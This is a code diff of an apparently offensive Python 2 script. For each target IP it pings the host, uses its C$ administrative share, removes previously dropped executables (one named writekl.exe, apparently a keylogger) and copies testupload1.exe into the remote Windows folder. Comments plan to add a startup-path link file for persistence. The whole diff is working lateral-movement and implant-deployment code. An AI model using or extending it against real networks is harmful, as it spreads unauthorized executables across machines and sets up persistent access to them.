@@ -22,15 +22,22 @@ def checkFile(ip_addr):
 def checkFile2(ip_addr):
     check = os.path.exists("\\\\" + ip_addr + "\\C$\\Windows\\testupload1.exe")
     return check
-
+# Need to replace file path with start up path
 def checkFile3(ip_addr):
     check = os.path.exists("\\\\" + ip_addr + "\\C$\\Windows\\testupload1.lnk")
     return check
 
-def copyFile(ip_addr):
+def copyFiles(ip_addr):
     # copy = subprocess.call("copy testupload1.exe \\\\" + ip_addr + "\\C$\\Windows\\")
-    copy = shutil.copy2("testupload1.exe", "\\\\" + ip_addr + "\\C$\\Windows\\")
-    return copy
+    exe = shutil.copy2("testupload1.exe", "\\\\" + ip_addr + "\\C$\\Windows\\")
+    checkexe = os.path.exists("\\\\" + ip_addr + "\\C$\\Windows\\testupload1.exe")
+    if checkexe != True:
+        print "Executable file failed to copy!"
+
+    ## Repeat above with start up path and link file
+
+with open('snake.txt', 'r') as snek:
+    print(snek.read())
 
 for target in targetList:
     try:
@@ -42,17 +49,18 @@ for target in targetList:
             print "Successful ping to " + target
             if netUse(target) == 0:
                 if checkFile(target) != 0:
-                    print "remove files"
+                    print "Removing writekl.exe file!"
                     os.remove("\\\\" + target + "\\C$\\Windows\\writekl.exe")
                 if checkFile2(target) != 0:
-                    print "remove files2"
+                    print "Removing TiWork.exe file!"
                     os.remove("\\\\" + target + "\\C$\\Windows\\testupload1.exe")
+                # Need to replace file path with start up file path
                 #if checkFile3(target) != 0:
-                #    print "remove link"
                 #    os.remove("\\\\" + ip_addr + "\\C$\\")
-                print "copy files"
-                #if copyFile(target) == 0:
-                    #print "WIN Again"
+                
+                print "Copying Files!"
+                copyFiles(target)
+                print "File copy complete!"
         if ping == 1:
             print "ErrorCode: 1. ## " + target + " will be removed from target list"
             cutList.append(target)
